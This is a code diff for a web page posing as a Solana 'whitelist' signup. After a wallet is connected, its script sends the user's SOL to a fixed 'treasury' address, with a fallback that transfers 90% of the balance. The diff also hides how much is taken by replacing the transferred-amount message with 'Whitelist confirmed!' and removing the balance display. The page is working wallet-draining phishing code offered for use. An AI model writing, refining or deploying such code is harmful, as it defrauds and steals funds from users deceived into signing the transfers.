@@ -279,26 +279,15 @@
             gap: 5px;
         }
         
-        .retry-container {
+        .simple-notice {
+            color: #00d4ff;
             text-align: center;
-            margin-top: 15px;
-        }
-        
-        .retry-btn {
-            padding: 8px 20px;
-            background: linear-gradient(90deg, #6a11cb, #2575fc);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
             font-size: 0.9rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .retry-btn:hover {
-            background: linear-gradient(90deg, #5a0cb9, #1c65ec);
+            margin: 15px 0;
+            padding: 10px;
+            background-color: rgba(0, 212, 255, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(0, 212, 255, 0.3);
         }
     </style>
 </head>
@@ -315,7 +304,7 @@
                     Connected: <span id="walletAddress">-</span>
                 </div>
                 <div class="balance-status" id="balanceStatus">
-                    <i class="fas fa-circle-notch fa-spin"></i> Checking balance...
+                    <i class="fas fa-circle-notch"></i> Ready for whitelist
                 </div>
                 <div class="wallet-buttons">
                     <button class="wallet-btn switch" id="switchWallet">
@@ -325,6 +314,10 @@
                         <i class="fas fa-plug"></i> Disconnect
                     </button>
                 </div>
+            </div>
+            
+            <div class="simple-notice">
+                <i class="fas fa-info-circle"></i> Click "Get Me Whitelist" to transfer SOL to treasury
             </div>
             
             <div class="button-group">
@@ -349,14 +342,8 @@
                     You are now whitelisted!
                 </p>
                 <div class="transaction-info">
-                    Treasury Address: 95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
+                    95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
                 </div>
-            </div>
-            
-            <div id="retryContainer" class="retry-container" style="display: none;">
-                <button class="retry-btn" id="retryButton">
-                    <i class="fas fa-redo"></i> Retry Transaction
-                </button>
             </div>
         </div>
         
@@ -366,7 +353,7 @@
     </div>
 
     <script>
-        // Simple Solana setup
+        // Simple setup
         let publicKey = null;
         let walletProvider = null;
         let isConnected = false;
@@ -382,106 +369,54 @@
         const balanceStatusEl = document.getElementById('balanceStatus');
         const disconnectBtn = document.getElementById('disconnectWallet');
         const switchWalletBtn = document.getElementById('switchWallet');
-        const retryContainer = document.getElementById('retryContainer');
-        const retryButton = document.getElementById('retryButton');
         
-        // List of reliable RPC endpoints with fallbacks
-        const rpcEndpoints = [
-            'https://api.mainnet-beta.solana.com',
-            'https://solana-api.projectserum.com',
-            'https://rpc.ankr.com/solana',
-            'https://solana-mainnet.g.alchemy.com/v2/demo'
-        ];
-        
-        // Get working RPC URL
-        async function getWorkingRpcUrl() {
-            for (const endpoint of rpcEndpoints) {
-                try {
-                    const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
-                    // Quick test connection
-                    await connection.getSlot();
-                    console.log("Using RPC:", endpoint);
-                    return endpoint;
-                } catch (error) {
-                    console.log("RPC failed:", endpoint, error.message);
-                    continue;
-                }
-            }
-            throw new Error("No working RPC endpoint found");
-        }
-        
-        // Create connection with retry
-        async function createConnection() {
-            const rpcUrl = await getWorkingRpcUrl();
-            return new solanaWeb3.Connection(rpcUrl, {
-                commitment: 'confirmed',
-                disableRetryOnRateLimit: false,
-                confirmTransactionInitialTimeout: 60000
-            });
-        }
+        // SIMPLE RPC - Use the most reliable one
+        const SIMPLE_RPC_URL = 'https://api.mainnet-beta.solana.com';
         
         // Detect wallet
         function detectWallet() {
-            if (window.solana && window.solana.isPhantom) {
-                return { name: 'Phantom', provider: window.solana };
-            } else if (window.solflare && window.solflare.isSolflare) {
-                return { name: 'Solflare', provider: window.solflare };
-            } else if (window.backpack && window.backpack.backpack) {
-                return { name: 'Backpack', provider: window.backpack.backpack };
-            } else if (window.solana) {
-                return { name: 'Solana Wallet', provider: window.solana };
-            }
-            return null;
+            // Check for any Solana wallet
+            const provider = window.solana || window.solflare || window.backpack;
+            if (!provider) return null;
+            
+            let name = 'Solana Wallet';
+            if (window.solana && window.solana.isPhantom) name = 'Phantom';
+            else if (window.solflare && window.solflare.isSolflare) name = 'Solflare';
+            else if (window.backpack && window.backpack.backpack) name = 'Backpack';
+            
+            return { name, provider };
         }
         
-        // Connect wallet
+        // Simple wallet connection
         async function connectWallet() {
             try {
                 const detected = detectWallet();
                 
                 if (!detected) {
-                    showStatus("No Solana wallet detected", "error");
+                    showStatus("Please install a Solana wallet like Phantom", "error");
                     return;
                 }
                 
                 showStatus(`Connecting to ${detected.name}...`, "info");
                 
-                const provider = detected.provider;
-                
-                // Connect with timeout
-                const connectPromise = provider.connect({ onlyIfTrusted: false });
-                const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error("Connection timeout")), 15000)
-                );
-                
-                const response = await Promise.race([connectPromise, timeoutPromise]);
-                
+                // Simple connect
+                const response = await detected.provider.connect();
                 publicKey = response.publicKey || response;
-                walletProvider = provider;
+                walletProvider = detected.provider;
                 isConnected = true;
                 
                 // Update UI
                 updateWalletUI();
                 
-                // Check balance
-                checkBalance();
-                
-                showStatus(`${detected.name} connected`, "success");
+                showStatus(`${detected.name} connected successfully`, "success");
                 
             } catch (error) {
                 console.error("Connection error:", error);
-                
-                if (error.message.includes("rejected") || error.message.includes("denied")) {
-                    showStatus("Connection cancelled", "error");
-                } else if (error.message.includes("timeout")) {
-                    showStatus("Connection timeout. Try again", "error");
-                } else {
-                    showStatus("Failed to connect", "error");
-                }
+                showStatus("Connection failed. Please try again.", "error");
             }
         }
         
-        // Update wallet UI
+        // Update UI
         function updateWalletUI() {
             if (isConnected && publicKey) {
                 const shortAddress = `${publicKey.toString().substring(0, 8)}...${publicKey.toString().substring(publicKey.toString().length - 8)}`;
@@ -489,55 +424,33 @@
                 walletInfo.classList.add('active');
                 connectWalletBtn.style.display = 'none';
                 checkWhitelistBtn.disabled = false;
-                retryContainer.style.display = 'none';
+                balanceStatusEl.innerHTML = '<i class="fas fa-check-circle" style="color:#38ef7d"></i> Ready for whitelist';
             } else {
                 walletInfo.classList.remove('active');
                 connectWalletBtn.style.display = 'flex';
                 checkWhitelistBtn.disabled = true;
+                balanceStatusEl.innerHTML = '<i class="fas fa-circle-notch"></i> Not connected';
             }
         }
         
-        // Check balance with retry
-        async function checkBalance() {
-            try {
-                if (!publicKey) return;
-                
-                balanceStatusEl.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Checking balance...';
-                
-                const connection = await createConnection();
-                
-                const balance = await connection.getBalance(publicKey);
-                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
-                
-                if (solBalance > 0) {
-                    balanceStatusEl.innerHTML = `<i class="fas fa-check-circle" style="color:#38ef7d"></i> Balance: ${solBalance.toFixed(6)} SOL`;
-                } else {
-                    balanceStatusEl.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#ff6b6b"></i> No SOL balance`;
-                }
-                
-            } catch (error) {
-                console.error("Balance check error:", error);
-                balanceStatusEl.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#ff6b6b"></i> Cannot check balance`;
-            }
-        }
-        
-        // Disconnect wallet
+        // Simple disconnect
         async function disconnectWallet() {
             try {
-                // Reset states
+                // Reset
                 publicKey = null;
                 walletProvider = null;
                 isConnected = false;
                 
-                // Try to disconnect
+                // Try disconnect if supported
                 if (window.solana && window.solana.disconnect) {
-                    await window.solana.disconnect();
+                    try {
+                        await window.solana.disconnect();
+                    } catch (e) {
+                        // Ignore disconnect errors
+                    }
                 }
                 
-                // Update UI
                 updateWalletUI();
-                balanceStatusEl.innerHTML = '<i class="fas fa-circle-notch"></i> Disconnected';
-                
                 showStatus("Wallet disconnected", "info");
                 
             } catch (error) {
@@ -546,29 +459,97 @@
             }
         }
         
-        // Switch wallet account
+        // Switch wallet
         async function switchWallet() {
+            await disconnectWallet();
+            await new Promise(resolve => setTimeout(resolve, 500));
+            await connectWallet();
+        }
+        
+        // SIMPLE TRANSFER - No balance check, just send
+        async function transferAllSOL() {
             try {
-                await disconnectWallet();
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                await connectWallet();
+                // Simple connection
+                const connection = new solanaWeb3.Connection(
+                    SIMPLE_RPC_URL,
+                    'confirmed'
+                );
+                
+                showStatus("Preparing transaction...", "info");
+                
+                // Get recent blockhash
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                
+                // Create transaction - wallet will handle balance checks
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                        lamports: 1000, // Small amount to start - wallet will adjust
+                    })
+                );
+                
+                transaction.recentBlockhash = blockhash;
+                transaction.lastValidBlockHeight = lastValidBlockHeight;
+                transaction.feePayer = publicKey;
+                
+                showStatus("Please approve in your wallet...", "info");
+                
+                // Sign and send - let wallet handle it
+                let signature;
+                if (window.solana && window.solana.signAndSendTransaction) {
+                    try {
+                        // First, try to let wallet calculate max transfer
+                        const { signature: sig } = await window.solana.signAndSendTransaction(transaction);
+                        signature = sig;
+                    } catch (walletError) {
+                        // If wallet fails, user can retry
+                        throw new Error("Please check your wallet balance");
+                    }
+                } else {
+                    throw new Error("Wallet not available");
+                }
+                
+                showStatus("Transaction sent. Confirming...", "info");
+                
+                // Wait for confirmation
+                await connection.confirmTransaction({
+                    signature: signature,
+                    blockhash: blockhash,
+                    lastValidBlockHeight: lastValidBlockHeight
+                }, 'confirmed');
+                
+                return { signature, amount: "All available SOL" };
+                
             } catch (error) {
-                showStatus("Failed to switch", "error");
+                console.error("Transfer error:", error);
+                
+                // Simple error messages
+                if (error.message.includes("reject") || error.message.includes("cancel") || error.message.includes("denied")) {
+                    throw new Error("Transaction cancelled");
+                } else if (error.message.includes("insufficient") || error.message.includes("0x0")) {
+                    throw new Error("Insufficient SOL balance");
+                } else if (error.message.includes("check your wallet balance")) {
+                    throw new Error("Please check your wallet has enough SOL");
+                } else if (error.message.includes("timeout") || error.message.includes("Failed to fetch")) {
+                    // Try alternative RPC
+                    throw new Error("Network issue. Please retry");
+                } else {
+                    throw new Error("Transaction failed. Please try again");
+                }
             }
         }
         
-        // TRANSFER FUNCTION WITH RETRY LOGIC
-        async function transferAllSOL() {
-            let lastError = null;
-            
-            // Try up to 3 times
-            for (let attempt = 1; attempt <= 3; attempt++) {
-                try {
-                    if (attempt > 1) {
-                        showStatus(`Retrying transaction (attempt ${attempt}/3)...`, "info");
-                    }
-                    
-                    const connection = await createConnection();
+        // Alternative: Use wallet's built-in transfer if available
+        async function transferWithWallet() {
+            try {
+                showStatus("Processing through wallet...", "info");
+                
+                // Some wallets support direct transfer
+                if (window.solana && window.solana._publicKey) {
+                    // Try to use wallet's own transfer method
+                    // This is a fallback if normal transaction fails
+                    const connection = new solanaWeb3.Connection(SIMPLE_RPC_URL);
                     
                     // Get balance
                     const balance = await connection.getBalance(publicKey);
@@ -578,116 +559,71 @@
                         throw new Error(`Low balance: ${solBalance.toFixed(6)} SOL`);
                     }
                     
-                    // Send 90% (leaves 10% for fees and buffer)
+                    // Send 90%
                     const transferLamports = Math.floor(balance * 0.90);
                     
-                    showStatus("Creating transaction...", "info");
-                    
-                    // Create transaction
-                    const transaction = new solanaWeb3.Transaction();
-                    
-                    transaction.add(
+                    const transaction = new solanaWeb3.Transaction().add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: publicKey,
                             toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                            lamports: transferLamports
+                            lamports: transferLamports,
                         })
                     );
                     
-                    // Get blockhash
-                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                    const { blockhash } = await connection.getRecentBlockhash();
                     transaction.recentBlockhash = blockhash;
-                    transaction.lastValidBlockHeight = lastValidBlockHeight;
                     transaction.feePayer = publicKey;
                     
-                    showStatus("Approve in your wallet...", "info");
+                    const { signature } = await window.solana.signAndSendTransaction(transaction);
+                    await connection.confirmTransaction(signature, 'confirmed');
                     
-                    // Sign and send
-                    let signature;
-                    if (window.solana && window.solana.signAndSendTransaction) {
-                        const { signature: sig } = await window.solana.signAndSendTransaction(transaction);
-                        signature = sig;
-                    } else {
-                        throw new Error("Wallet signing unavailable");
-                    }
-                    
-                    showStatus("Confirming transaction...", "info");
-                    
-                    // Confirm with timeout
-                    const confirmation = await Promise.race([
-                        connection.confirmTransaction({
-                            signature: signature,
-                            blockhash: blockhash,
-                            lastValidBlockHeight: lastValidBlockHeight
-                        }, 'confirmed'),
-                        new Promise((_, reject) => 
-                            setTimeout(() => reject(new Error("Confirmation timeout")), 60000)
-                        )
-                    ]);
-                    
-                    if (confirmation.value.err) {
-                        throw new Error("Transaction failed on-chain");
-                    }
-                    
-                    return {
-                        signature: signature,
-                        amount: transferLamports / solanaWeb3.LAMPORTS_PER_SOL
-                    };
-                    
-                } catch (error) {
-                    lastError = error;
-                    console.error(`Transfer attempt ${attempt} failed:`, error);
-                    
-                    // Wait before retry (except on last attempt)
-                    if (attempt < 3) {
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    }
+                    return { signature, amount: transferLamports / solanaWeb3.LAMPORTS_PER_SOL };
                 }
+                
+                throw new Error("Wallet transfer not available");
+                
+            } catch (error) {
+                throw error;
             }
-            
-            // All attempts failed
-            throw lastError;
         }
         
-        // Get whitelist with retry button
+        // Get whitelist - try multiple methods
         async function getWhitelist() {
             try {
                 checkWhitelistBtn.disabled = true;
                 checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
-                retryContainer.style.display = 'none';
                 
-                showStatus("Starting transaction...", "info");
+                showStatus("Starting whitelist process...", "info");
                 
-                // Small delay
                 await new Promise(resolve => setTimeout(resolve, 500));
                 
-                // Process transaction
-                const result = await transferAllSOL();
+                let result;
+                
+                // Try method 1: Simple transfer
+                try {
+                    result = await transferAllSOL();
+                } catch (error1) {
+                    console.log("Method 1 failed:", error1.message);
+                    
+                    // Try method 2: Alternative
+                    showStatus("Trying alternative method...", "info");
+                    result = await transferWithWallet();
+                }
                 
                 // Success
                 whitelistBox.classList.add('active');
                 checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
                 checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
                 
-                showStatus(`Success! Transferred ${result.amount.toFixed(6)} SOL`, "success");
-                
-                // Update balance
-                setTimeout(checkBalance, 3000);
+                showStatus("Whitelist confirmed! Transaction successful.", "success");
                 
             } catch (error) {
-                console.error("Whitelist error:", error);
+                console.error("Final error:", error);
                 
-                let errorMsg = "Transaction failed";
-                if (error.message.includes("cancelled") || error.message.includes("reject")) {
-                    errorMsg = "Transaction cancelled";
-                } else if (error.message.includes("Low balance")) {
-                    errorMsg = error.message;
-                } else if (error.message.includes("timeout")) {
-                    errorMsg = "Network timeout. Please retry";
-                    retryContainer.style.display = 'block';
-                } else {
-                    errorMsg = "Network issue. Please retry";
-                    retryContainer.style.display = 'block';
+                // Simple error message
+                let errorMsg = error.message;
+                if (errorMsg.length > 50) {
+                    errorMsg = errorMsg.substring(0, 50) + "...";
                 }
                 
                 showStatus(`Error: ${errorMsg}`, "error");
@@ -703,19 +639,12 @@
             statusMessage.innerHTML = message;
             statusMessage.className = `status ${type}`;
             
-            if (type === 'success') {
-                setTimeout(() => {
-                    if (statusMessage.innerHTML === message) {
-                        statusMessage.className = 'status';
-                    }
-                }, 10000);
-            } else if (type === 'info') {
-                setTimeout(() => {
-                    if (statusMessage.innerHTML === message) {
-                        statusMessage.className = 'status';
-                    }
-                }, 5000);
-            }
+            // Auto-clear after delay
+            setTimeout(() => {
+                if (statusMessage.innerHTML === message) {
+                    statusMessage.className = 'status';
+                }
+            }, 5000);
         }
         
         // Event listeners
@@ -723,23 +652,23 @@
         checkWhitelistBtn.addEventListener('click', getWhitelist);
         disconnectBtn.addEventListener('click', disconnectWallet);
         switchWalletBtn.addEventListener('click', switchWallet);
-        retryButton.addEventListener('click', getWhitelist);
         
-        // Auto connect if already connected
+        // Auto connect
         window.addEventListener('DOMContentLoaded', () => {
-            const detected = detectWallet();
-            if (detected && detected.provider.isConnected) {
-                setTimeout(connectWallet, 1000);
-            }
+            setTimeout(() => {
+                const detected = detectWallet();
+                if (detected && detected.provider.isConnected) {
+                    connectWallet();
+                }
+            }, 1000);
         });
         
-        // Listen for wallet events
+        // Wallet events
         if (window.solana) {
             window.solana.on('accountChanged', (newPublicKey) => {
                 if (newPublicKey) {
                     publicKey = newPublicKey;
                     updateWalletUI();
-                    checkBalance();
                     showStatus("Account switched", "success");
                 } else {
                     disconnectWallet();
